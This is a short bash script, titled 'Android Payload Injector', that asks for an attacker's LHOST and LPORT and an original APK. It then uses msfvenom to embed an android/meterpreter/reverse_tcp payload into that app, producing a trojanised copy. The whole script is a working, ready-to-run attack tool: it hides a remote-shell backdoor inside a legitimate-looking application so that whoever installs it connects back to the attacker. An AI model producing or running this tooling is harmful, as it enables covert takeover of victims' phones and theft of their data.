#!/bin/bash

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No color

# Improved Banner
clear
echo -e "${CYAN}"
echo "    █████╗ ██╗   ██╗███╗   ██╗    ";
echo "   ██╔══██╗██║   ██║████╗  ██║    ";
echo "   ███████║██║   ██║██╔██╗ ██║    ";
echo "   ██╔══██║██║   ██║██║╚██╗██║    ";
echo "   ██║  ██║╚██████╔╝██║ ╚████║    ";
echo "   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ";
echo -e "${YELLOW}          Android Payload Injector${NC}"
echo -e "${GREEN}                AVN              ${NC}"
echo ""

# User inputs
read -p "Enter your LHOST (IP address): " lhost
read -p "Enter your LPORT (Port): " lport
read -p "Enter the path of the original APK file: " apk_path
read -p "Enter the name of the original APK file: " apk_name
read -p "Enter the path to save the modified APK file: " output_path
read -p "Enter the name of the modified APK file: " output_apk_name

# Show details to the user
echo -e "${BLUE}Injecting payload into APK...${NC}"
echo "LHOST: $lhost"
echo "LPORT: $lport"
echo "Original APK Path: $apk_path/$apk_name"
echo "Modified APK Path: $output_path/$output_apk_name"

# Injecting payload
msfvenom -x "$apk_path/$apk_name" -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "$output_path/$output_apk_name"

# Check if injection was successful
if [ $? -eq 0 ]; then
  echo -e "${GREEN}Payload successfully injected into $output_apk_name!${NC}"
else
  echo -e "${RED}Failed to inject payload.${NC}"
fi